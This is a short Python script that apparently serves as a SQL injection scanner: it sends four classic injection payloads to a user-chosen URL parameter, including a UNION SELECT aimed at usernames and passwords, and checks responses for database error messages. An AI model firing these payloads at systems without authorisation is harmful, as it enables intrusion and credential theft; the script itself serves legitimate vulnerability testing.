import requests

def detect_sqli(url, param):
    # Common SQL injection payloads
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL, username, password FROM users --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --"
    ]

    # SQL-specific error messages to look for
    sql_error_indicators = [
        "you have an error in your sql syntax",
        "unclosed quotation mark after the character string",
        "syntax error",
        "sql syntax",
        "unknown column",
        "mysql_fetch",
        "sql error",
        "sqlstate",
        "pg_query",
        "odbc_exec",
        "microsoft oledb"
    ]

    results = []
    
    for payload in sqli_payloads:
        # Construct URL with SQLi payload
        test_url = f"{url}?{param}={payload}"
        
        try:
            # Send request with SQLi payload
            response = requests.get(test_url, timeout=10)
            response_text = response.text.lower()
            
            # Check for specific SQL-related error messages
            if any(error in response_text for error in sql_error_indicators):
                results.append(f"SQLi Detected: Server responded with SQL error message using payload '{payload}'")
            else:
                results.append(f"SQLi Test with payload '{payload}' did not yield signs of vulnerability.")
                
        except requests.RequestException as e:
            results.append(f"Error during SQLi detection with payload '{payload}': {str(e)}")

    if results:
        return "\n".join(results)
    else:
        return "No SQL Injection vulnerabilities detected."

# Example usage:
if __name__ == "__main__":
    url = input("Enter the URL to test: ")
    param = input("Enter the parameter to test for SQL injection: ")
    print(detect_sqli(url, param))
